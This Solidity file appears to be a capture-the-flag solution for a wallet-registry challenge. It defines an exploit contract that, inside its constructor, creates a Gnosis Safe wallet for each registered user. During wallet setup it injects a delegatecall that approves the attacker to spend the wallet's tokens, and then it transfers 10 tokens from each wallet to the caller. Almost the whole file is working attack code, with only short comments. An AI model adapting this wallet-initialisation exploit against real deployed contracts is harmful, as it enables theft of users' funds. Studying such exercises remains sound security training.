// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./WalletRegistry.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";

contract DelegateCall {
    // remember that this is a delegatecall, we wont be able to access the storage properly.
    function approve(
        IERC20 token,
        address spender,
        uint256 amount
    ) public {
        token.approve(spender, amount);
    }
}

contract HackBackdoor {
    uint256 immutable DRAIN_AMOUNT = 10 ether;

    // attack execute in constructor to pass 1 transaction requirement
    constructor(address _registry, address[] memory _users) {
        DelegateCall delegate = new DelegateCall();
        WalletRegistry registry = WalletRegistry(_registry);
        GnosisSafeProxyFactory factory = GnosisSafeProxyFactory(
            registry.walletFactory()
        );
        IERC20 token = registry.token();

        for (uint8 i; i < _users.length; ) {
            address[] memory owners = new address[](1);
            owners[0] = _users[i];

            // corresponds to GnosisSafeProxyFactory.createProxyWithCallback(..,bytes memory initializer,..)
            // has function selector = GnosisSafe.setup.selector
            // and parameters corresponding to GnosisSafe.setup()
            bytes memory init = abi.encodeWithSelector(
                GnosisSafe.setup.selector,
                owners, // _owners List of Safe owners.
                1, // _threshold Number of required confirmations for a Safe transaction.
                address(delegate), // to Contract address for optional delegate call.
                abi.encodeWithSelector(
                    DelegateCall.approve.selector,
                    token,
                    address(this),
                    DRAIN_AMOUNT
                ), // data Data payload for optional delegate call.
                address(0), // fallbackHandler Handler for fallback calls to this contract
                0, // paymentToken Token that should be used for the payment (0 is ETH)
                0, // payment Value that should be paid
                0 // paymentReceiver Adddress that should receive the payment (or 0 if tx.origin)
            );

            GnosisSafeProxy wallet = factory.createProxyWithCallback(
                registry.masterCopy(), // _singleton Address of singleton contract.
                init, // initializer Payload for message call sent to new proxy contract.
                i, // saltNonce Nonce that will be used to generate the salt to calculate the address of the new proxy contract.
                IProxyCreationCallback(registry) // callback Callback that will be invoced after the new proxy contract has been successfully deployed and initialized.
            );
            token.transferFrom(address(wallet), msg.sender, DRAIN_AMOUNT);

            unchecked {
                ++i;
            }
        }
    }
}
